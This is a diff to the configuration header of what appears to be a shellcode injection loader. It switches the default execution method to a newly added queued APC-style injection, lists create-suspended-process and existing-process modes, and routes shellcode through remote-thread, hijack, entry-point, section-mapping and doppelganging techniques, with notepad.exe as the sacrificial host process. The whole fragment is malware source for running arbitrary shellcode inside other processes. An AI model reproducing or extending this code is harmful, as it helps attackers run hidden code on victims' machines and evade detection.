@@ -92,26 +92,26 @@ unsigned char shellcode[] = {
 // Accept user input for a list of processes to inject into
 
 // Execution Methods
-#define CONFIG_EXECUTION_METHOD 3
+#define CONFIG_EXECUTION_METHOD 6
 
-//
-// ProcessHollowing
-// AddressOfEntryPoint
-// DoppleGanging
-//
-#define CONFIG_CREATE_PROCESS_METHOD 2
+// 1 - Create Suspended Process
+// 2 - Thread to Address of Entry Point
+// 3 - Existing Process
+#define CONFIG_CREATE_PROCESS_METHOD 1
 #define CONFIG_SACRIFICIAL_PROCESS "C:\\Windows\\System32\\notepad.exe"
 
 #if CONFIG_EXECUTION_METHOD == 1
-#define ExecuteShellcode(phandle, shellcode, shellcode_len) execute::CreateRemoteThreadInjection(phandle, shellcode, shellcode_len)
+#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) execute::InjectionCreateRemoteThread(phandle, shellcode, shellcode_len, ahandle)
 #elif CONFIG_EXECUTION_METHOD == 2
-#define ExecuteShellcode(phandle, shellcode, shellcode_len) execute::RemoteHijack(phandle, shellcode, shellcode_len)
+#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) execute::InjectionRemoteHijack(phandle, shellcode, shellcode_len, ahandle)
 #elif CONFIG_EXECUTION_METHOD == 3
-#define ExecuteShellcode(phandle, shellcode, shellcode_len) execute::AddressOfEntryPoint(phandle, shellcode, shellcode_len)
+#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) execute::InjectionAddressOfEntryPoint(phandle, shellcode, shellcode_len, ahandle)
 #elif CONFIG_EXECUTION_METHOD == 4
-#define ExecuteShellcode(phandle, shellcode, shellcode_len) malapi::InjectionNtMapViewOfSection(phandle, shellcode, shellcode_len)
+#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) malapi::InjectionNtMapViewOfSection(phandle, shellcode, shellcode_len, ahandle)
 #elif CONFIG_EXECUTION_METHOD == 5
-#define ExecuteShellcode(phandle, shellcode, shellcode_len) execute::Doppleganger(phandle, shellcode, shellcode_len)
+#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) execute::InjectionDoppleganger(phandle, shellcode, shellcode_len, ahandle)
+#elif CONFIG_EXECUTION_METHOD == 6
+#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) execute::InjectionQueueUserInject(phandle, shellcode, shellcode_len, ahandle)
 #endif
 
 //
